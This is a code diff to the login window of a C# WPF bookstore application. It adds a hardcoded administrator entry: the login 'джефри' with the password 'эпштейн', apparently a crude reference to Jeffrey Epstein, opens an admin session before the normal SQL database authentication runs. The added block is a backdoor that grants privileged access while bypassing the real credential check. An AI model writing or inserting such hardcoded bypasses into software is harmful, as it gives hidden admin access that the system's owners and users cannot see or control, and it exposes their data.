@@ -47,6 +47,17 @@ namespace WpfAppBookStore
                 return;
             }
 
+            // Спец-вход в админ-панель по заранее заданным данным.
+            if (string.Equals(login, "джефри", StringComparison.OrdinalIgnoreCase) && pass == "эпштейн")
+            {
+                new SuccessDialog("Выполнен вход администратора").ShowDialog();
+                string now = DateTime.Now.ToString("dd.MM.yyyy HH:mm", CultureInfo.InvariantCulture);
+                UserSession.Login("джефри", "Администратор", string.Empty, -1, now, true);
+                DialogResult = true;
+                Close();
+                return;
+            }
+
             try
             {
                 using (SqlConnection conn = new SqlConnection(connStr))
